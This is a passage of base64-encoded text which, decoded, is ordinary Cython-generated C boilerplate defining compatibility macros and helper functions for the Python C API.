ShvKQogICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfR0VUX1NJWkUobykKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKG8pIFB5VW5pY29kZV9HRVRfTEVOR1RIKG8pCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKG8pIFB5VHVwbGVfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9TSVpFKG8pIFB5TGlzdF9TaXplKG8pCiAgI2RlZmluZSBfX1B5eF9QeVNldF9HRVRfU0laRShvKSBQeVNldF9TaXplKG8pCiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0dFVF9TSVpFKG8pIFB5Qnl0ZXNfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgobykgUHlVbmljb2RlX0dldExlbmd0aChvKQojZW5kaWYKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICNkZWZpbmUgX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKG5hbWUpIFB5SW1wb3J0X0FkZE1vZHVsZVJlZihuYW1lKQojZWxzZQogIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoY29uc3QgY2hhciAqbmFtZSkgewogICAgICBQeU9iamVjdCAqbW9kdWxlID0gUHlJbXBvcnRfQWRkTW9kdWxlKG5hbWUpOwogICAgICBQeV9YSU5DUkVGKG1vZHVsZSk7CiAgICAgIHJldHVybiBtb2R1bGU7CiAgfQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAhZGVmaW5lZChQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZykKICAjZGVmaW5lIFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKHMpIFB5VW5pY29kZV9Gcm9tU3RyaW5nKHMpCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5TG9uZ19Gcm9tSGFzaF90IFB5TG9uZ19Gcm9tU3NpemVfdAojZGVmaW5lIF9fUHl4X1B5TG9uZ19Bc0hhc2hfdCAgIF9fUHl4X1B5SW5kZXhfQXNTc2l6ZV90CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKICAgICNkZWZpbmUgX19QeXhfUHlTZW5kUmVzdWx0IFB5U2VuZFJlc3VsdAojZWxzZQogICAgdHlwZWRlZiBlbnVtIHsKICAgICAgICBQWUdFTl9SRVRVUk4gPSAwLAogICAgICAgIFBZR0VOX0VSUk9SID0gLTEsCiAgICAgICAgUFlHRU5fTkVYVCA9IDEsCiAgICB9IF9fUHl4X1B5U2VuZFJlc3VsdDsKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBBMwogIHR5cGVkZWYgX19QeXhfUHlTZW5kUmVzdWx0ICgqX19QeXhfcHlpdGVyX3NlbmRmdW5jKShQeU9iamVjdCAqaXRlciwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJlc3VsdCk7CiNlbHNlCiAgI2RlZmluZSBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgc2VuZGZ1bmMKI2VuZGlmCiNpZiAhQ1lUSE9OX1VTRV9BTV9TRU5ECiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMAojZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKI2RlZmluZSBfX1BZWF9IQVNfUFlfQU1fU0VORCAxCiNlbHNlCiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMiAgLy8gb3VyIG93biBiYWNrcG9ydGVkIGltcGxlbWVudGF0aW9uCiNlbmRpZgojaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPCAyCiAgICAjZGVmaW5lIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0IFB5QXN5bmNNZXRob2RzCiNlbHNlCiAgICB0eXBlZGVmIHN0cnVjdCB7CiAgICAgICAgdW5hcnlmdW5jIGFtX2F3YWl0OwogICAgICAgIHVuYXJ5ZnVuYyBhbV9haXRlcjsKICAgICAgICB1bmFyeWZ1bmMgYW1fYW5leHQ7CiAgICAgICAgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGFtX3NlbmQ7CiAgICB9IF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0OwogICAgI2RlZmluZSBfX1B5eF9TbG90VHBBc0FzeW5jKHMpICgoUHlBc3luY01ldGhvZHMqKShzKSkKI2VuZGlmCiNpZiBDWVRIT05fVVNFX0FNX1NFTkQgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEYwCiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgxVUwgPDwgMjEpCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgwKQojZW5kaWYKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKI2RlZmluZSBfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkgUHlJbnRlcnByZXRlclN0YXRlX0dldCgpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpIFB5VGhyZWFkU3RhdGVfR2V0KCktPmludGVycAojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiNpZmRlZiBfX2NwbHVzcGx1cwpleHRlcm4gIkMiCiNlbmRpZgpQeUFQSV9GVU5DKHZvaWQgKikgUHlNZW1fQ2FsbG9jKHNpemVfdCBuZWxlbSwgc2l6ZV90IGVsc2l6ZSk7CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgaW50IF9fUHl4X2luaXRfY29fdmFyaWFibGUoUHlPYmplY3QgKmluc3BlY3QsIGNvbnN0IGNoYXIqIG5hbWUsIGludCAqd3JpdGVfdG8pIHsKICAgIGludCB2YWx1ZTsKICAgIFB5T2JqZWN0ICpweV92YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoaW5zcGVjdCwgbmFtZSk7CiAgICBpZiAoIXB5X3ZhbHVlKSByZXR1cm4gMDsKICAgIHZhbHVlID0gKGludCkgUHlMb25nX0FzTG9uZyhweV92YWx1ZSk7CiAgICBQeV9ERUNSRUYocHlfdmFsdWUpOwogICAgKndyaXRlX3RvID0gdmFsdWU7CiAgICByZXR1cm4gdmFsdWUgIT0gLTEgfHwgIVB5RXJyX09jY3VycmVkKCk7Cn0Kc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKSB7CiAgICBQeU9iamVjdCAqaW5zcGVjdDsKICAgIGludCByZXN1bHQ7CiAgICBpbnNwZWN0ID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJpbnNwZWN0Iik7CiAgICByZXN1bHQgPQojaWYgIWRlZmluZWQoQ09fT1BUSU1JWkVEKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX09QVElNSVpFRCIsICZDT19PUFRJTUlaRUQpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fTkVXTE9DQUxTKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX05FV0xPQ0FMUyIsICZDT19ORVdMT0NBTFMpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fVkFSQVJHUykKICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19WQVJBUkdTIiwgJkNPX1ZBUkFSR1MpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fVkFSS0VZV09SRFMpCiAgICAgICAgX19QeXhfaW5pdF9jb192YXJpYWJsZShpbnNwZWN0LCAiQ09fVkFSS0VZV09SRFMiLCAmQ09fVkFSS0VZV09SRFMpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fQVNZTkNfR0VORVJBVE9SKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0FTWU5DX0dFTkVSQVRPUiIsICZDT19BU1lOQ19HRU5FUkFUT1IpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fR0VORVJBVE9SKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0dFTkVSQVRPUiIsICZDT19HRU5FUkFUT1IpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fQ09ST1VUSU5FKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0NPUk9VVElORSIsICZDT19DT1JPVVRJTkUpICYmCiNlbmRpZgogICAgICAgIDE7CiAgICBQeV9ERUNSRUYoaW5zcGVjdCk7CiAgICByZXR1cm4gcmVzdWx0ID8gMCA6IC0xOwp9CiNlbHNlCnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCkgewogICAgcmV0dXJuIDA7ICAvLyBJdCdzIGEgbGltaXRlZCBBUEktb25seSBmZWF0dXJlCn0KI2VuZGlmCgoKI2lmIGRlZmluZWQoX1dJTjMyKSB8fCBkZWZpbmVkKFdJTjMyKSB8fCBkZWZpbmVkKE1TX1dJTkRPV1MpCiAgI2lmbmRlZiBfVVNFX01BVEhfREVGSU5FUwogICAgI2RlZmluZSBfVVNFX01BVEhfREVGSU5FUwogICNlbmRpZgojZW5kaWYKI2luY2x1ZGUgPG1hdGguaD4KI2lmZGVmIE5BTgojZGVmaW5lIF9fUFlYX05BTigpICgoZmxvYXQpIE5BTikKI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgZmxvYXQgX19QWVhfTkFOKCkgewogIGZsb2F0IHZhbHVlOwogIG1lbXNldCgmdmFsdWUsIDB4RkYsIHNpemVvZih2YWx1ZSkpOwogIHJldHVybiB2YWx1ZTsKfQojZW5kaWYKI2lmIGRlZmluZWQoX19DWUdXSU5fXykgJiYgZGVmaW5lZChfTERCTF9FUV9EQkwpCiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jCiNlbHNlCiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jbAojZW5kaWYKCiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FCiNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FIDAKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwojZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FCiNlbmRpZgojaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwojZGVmaW5lIF9fUFlYX01BUktfRVJSX1BPUyhmX2luZGV4LCBsaW5lbm8pICB7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfZltmX2luZGV4XTsgKHZvaWQpIF9fcHl4X2ZpbGVuYW1lOyBfX3B5eF9saW5lbm8gPSBsaW5lbm87ICh2b2lkKSBfX3B5eF9saW5lbm87IF9fcHl4X2NsaW5lbm8gPSBfX0xJTkVfXzsgKHZvaWQpIF9fcHl4X2NsaW5lbm87IH0KI2Vsc2UKI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyAodm9pZCkgX19weXhfY2xpbmVubzsgfQojZW5kaWYKI2RlZmluZSBfX1BZWF9FUlIoZl9pbmRleCwgbGluZW5vLCBMbl9lcnJvcikgXAogICAgeyBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSBnb3RvIExuX2Vycm9yOyB9CgojaWZkZWYgQ1lUSE9OX0VYVEVSTl9DCiAgICAjdW5kZWYgX19QWVhfRVhURVJOX0MKICAgICNkZWZpbmUgX19QWVhfRVhURVJOX0MgQ1lUSE9OX0VYVEVSTl9DCiNlbGlmIGRlZmluZWQoX19QWVhfRVhURVJOX0MpCiAgICAjaWZkZWYgX01TQ19WRVIKICAgICNwcmFnbWEgbWVzc2FnZSAoIlBsZWFzZSBkbyBub3QgZGVmaW5lIHRoZSAnX19QWVhfRVhURVJOX0MnIG1hY3JvIGV4dGVybmFsbHkuIFVzZSAnQ1lUSE9OX0VYVEVSTl9DJyBpbnN0ZWFkLiIpCiAgICAjZWxzZQogICAgI3dhcm5pbmcgUGxlYXNlIGRvIG5vdCBkZWZpbmUgdGhlICdfX1BZWF9FWFRFUk5fQycgbWFjcm8gZXh0ZXJuYWxseS4gVXNlICdDWVRIT05fRVhURVJOX0MnIGluc3RlYWQuCiAgICAjZW5kaWYKI2Vsc2UKICAjaWZkZWYgX19jcGx1c3BsdXMKICAgICNkZWZpbmUgX19QWVhfRVhURVJOX0MgZXh0ZXJuICJDIgogICNlbHNlCiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVybgogICNlbmRpZgojZW5kaWYKCiNkZWZpbmUgX19QWVhfSEFWRV9fdGYKI2RlZmluZSBfX1BZWF9IQVZFX0FQSV9fdGYKCiNpZmRlZiBfT1BFTk1QCiNpbmNsdWRlIDxvbXAuaD4KI2VuZGlmIAoKI2lmIGRlZmluZWQoUFlSRVhfV0lUSE9VVF9BU1NFUlRJT05TKSAmJiAhZGVmaW5lZChDWVRIT05fV0lUSE9VVF9BU1NFUlRJT05TKQojZGVmaW5lIENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlMKI2VuZGlmCgojZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIDAKI2RlZmluZSBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4IDAKI2RlZmluZSBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElORyAiIgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbVN0cmluZ0FuZFNpemUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZQojZGVmaW5lIF9fUHl4X3VjaGFyX2Nhc3QoYykgKCh1bnNpZ25lZCBjaGFyKWMpCiNkZWZpbmUgX19QeXhfbG9uZ19jYXN0KHgpICgobG9uZyl4KQojZGVmaW5lIF9fUHl4X2ZpdHNfUHlfc3NpemVfdCh2LCB0eXBlLCBpc19zaWduZWQpICAoXAogICAgKHNpemVvZih0eXBlKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgIHx8XAogICAgKHNpemVvZih0eXBlKSA+IHNpemVvZihQeV9zc2l6ZV90KSAmJlwKICAgICAgICAgIGxpa2VseSh2IDwgKHR5cGUpUFlfU1NJWkVfVF9NQVggfHxcCiAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkgICYmXAogICAgICAgICAgKCFpc19zaWduZWQgfHwgbGlrZWx5KHYgPiAodHlwZSlQWV9TU0laRV9UX01JTiB8fFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2ID09ICh0eXBlKVBZX1NTSVpFX1RfTUlOKSkpICB8fFwKICAgIChzaXplb2YodHlwZSkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpICYmXAogICAgICAgICAgKGlzX3NpZ25lZCB8fCBsaWtlbHkodiA8ICh0eXBlKVBZX1NTSVpFX1RfTUFYIHx8XAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkpKSAgKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfaXNfdmFsaWRfaW5kZXgoUHlfc3NpemVfdCBpLCBQeV9zc2l6ZV90IGxpbWl0KSB7CiAgICByZXR1cm4gKHNpemVfdCkgaSA8IChzaXplX3QpIGxpbWl0Owp9CiNpZiBkZWZpbmVkIChfX2NwbHVzcGx1cykgJiYgX19jcGx1c3BsdXMgPj0gMjAxMTAzTAogICAgI2luY2x1ZGUgPGNzdGRsaWI+CiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIHN0ZDo6YWJzKHZhbHVlKQojZWxpZiBTSVpFT0ZfSU5UID49IFNJWkVPRl9TSVpFX1QKICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgYWJzKHZhbHVlKQojZWxpZiBTSVpFT0ZfTE9ORyA+PSBTSVpFT0ZfU0laRV9UCiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxhYnModmFsdWUpCiNlbGlmIGRlZmluZWQgKF9NU0NfVkVSKQogICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSAoKFB5X3NzaXplX3QpX2FiczY0KHZhbHVlKSkKI2VsaWYgZGVmaW5lZCAoX19TVERDX1ZFUlNJT05fXykgJiYgX19TVERDX1ZFUlNJT05fXyA+PSAxOTk5MDFMCiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxsYWJzKHZhbHVlKQojZWxpZiBkZWZpbmVkIChfX0dOVUNfXykKICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgX19idWlsdGluX2xsYWJzKHZhbHVlKQojZWxzZQogICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSAoKHZhbHVlPDApID8gLXZhbHVlIDogdmFsdWUpCiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X3NzaXplX3N0cmxlbihjb25zdCBjaGFyICpzKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmcoUHlPYmplY3QqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiwgUHlfc3NpemVfdCogbGVuZ3RoKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciopOwojZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmdBbmRTaXplKHMsIGwpIFB5Qnl0ZUFycmF5X0Zyb21TdHJpbmdBbmRTaXplKChjb25zdCBjaGFyKilzLCBsKQojZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZyAgICAgICAgUHlCeXRlc19Gcm9tU3RyaW5nCiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKik7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVNTdHJpbmcocykgICAgKChzaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1NTdHJpbmcocykgICAgKChjb25zdCBzaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzVVN0cmluZyhzKSAgICAoKGNvbnN0IHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQVNfU1RSSU5HKHMpCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU1N0cmluZyhzKSAgICAoKHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlVVN0cmluZyhzKSAgICAoKHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQXNTdHJpbmcocykKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNXcml0YWJsZVN0cmluZyhzKSAgICAoKGNoYXIqKShfX3B5eF91aW50cHRyX3QpIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVTU3RyaW5nKHMpICAgICgoc2lnbmVkIGNoYXIqKShfX3B5eF91aW50cHRyX3QpIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbUNTdHJpbmcocykgIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpCiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tQ1N0cmluZyhzKSAgIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZygoY29uc3QgY2hhciopcykKI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tQ1N0cmluZyhzKSAgIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpCiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21DU3RyaW5nKHMpIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tT3JkaW5hbChvKSAgICAgICBQeVVuaWNvZGVfRnJvbU9yZGluYWwoKGludClvKQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Bc1VuaWNvZGUgICAgICAgICAgICBQeVVuaWNvZGVfQXNVbmljb2RlCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9OZXdSZWYoUHlPYmplY3QgKm9iaikgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwYTAwMDAgfHwgZGVmaW5lZChQeV9OZXdSZWYpCiAgICByZXR1cm4gUHlfTmV3UmVmKG9iaik7CiNlbHNlCiAgICBQeV9JTkNSRUYob2JqKTsKICAgIHJldHVybiBvYmo7CiNlbmRpZgp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9YTmV3UmVmKFB5T2JqZWN0ICpvYmopIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfWE5ld1JlZikKICAgIHJldHVybiBQeV9YTmV3UmVmKG9iaik7CiNlbHNlCiAgICBQeV9YSU5DUkVGKG9iaik7CiAgICByZXR1cm4gb2JqOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfT3duZWRfUHlfTm9uZShpbnQgYik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlCb29sX0Zyb21Mb25nKGxvbmcgYik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWUoUHlPYmplY3QqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZUFuZERlY3JlZihQeU9iamVjdCopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZyhQeU9iamVjdCogeCk7CiNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9UdXBsZShvYmopXAogICAgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qob2JqKSkgPyBfX1B5eF9OZXdSZWYob2JqKSA6IFB5U2VxdWVuY2VfVHVwbGUob2JqKSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X2hhc2hfdCBfX1B5eF9QeUluZGV4X0FzSGFzaF90KFB5T2JqZWN0Kik7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSAoUHlGbG9hdF9DaGVja0V4YWN0KHgpID8gUHlGbG9hdF9BU19ET1VCTEUoeCkgOiBQeUZsb2F0X0FzRG91YmxlKHgpKQojZGVmaW5lIF9fUHl4X1B5RmxvYXRfQVNfRE9VQkxFKHgpIFB5RmxvYXRfQVNfRE9VQkxFKHgpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSBQeUZsb2F0X0FzRG91YmxlKHgpCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoeCkgUHlGbG9hdF9Bc0RvdWJsZSh4KQojZW5kaWYKI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FzRmxvYXQoeCkgKChmbG9hdCkgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSkKI2RlZmluZSBfX1B5eF9QeU51bWJlcl9JbnQoeCkgKFB5TG9uZ19DaGVja0V4YWN0KHgpID8gX19QeXhfTmV3UmVmKHgpIDogUHlOdW1iZXJfTG9uZyh4KSkKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE3C